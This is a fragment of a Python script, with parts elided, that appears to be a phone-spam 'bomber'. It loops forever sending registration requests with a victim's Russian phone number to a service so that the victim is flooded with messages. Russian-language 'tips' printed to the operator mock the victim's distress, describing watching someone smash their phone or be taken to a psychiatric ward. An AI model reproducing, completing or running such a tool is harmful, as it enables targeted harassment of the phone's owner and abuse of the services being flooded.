...
def qw(_phone):
    ...
    while True:
        ...
        try:
            requests.get('https://findclone.u/register', data={"phone": _phone})
        except:
            s=s
...
"""]
sovet = ["""Приготовить чай, сесть по удобнее и
наблюдать как кто-то долбит телефон об стену.
""",
"""Лечь на диван, а затем закрыть глаза радуясь о том,
что кого-то скоро уведут в дурку.
""",
"""Спустя пару секунд спросить <<Как дела с телефоном?>>
""",
"""Оставь всё как есть и идти спать.
""",
"""Слушать эту музыку для ушей, когда у кого-то нервишки играют.
"""]
y = 0
os.system("clear")
while len(anim) > y:
...
print(colored('Если хотите вернуться назад, введите "back" заместо номера ', "cyan"))
print("")

_phone = input("\033[37m [Your number]:\033[0m +7 ")
print("\033[32mСпам уже начался! Советую:\033[0m")
print("\033[33m"+sovet[random.randint(0, len(sovet)-1)]+"\033[0m")
if _phone == "back" or _phone == "Back":
	os.system("python HTPFL.py")
else:
	while True:
		print("")
		print(colored("Чтобы остановить спам введите 'Ctrl + Z' ", "yellow"))
		qw(_phone)
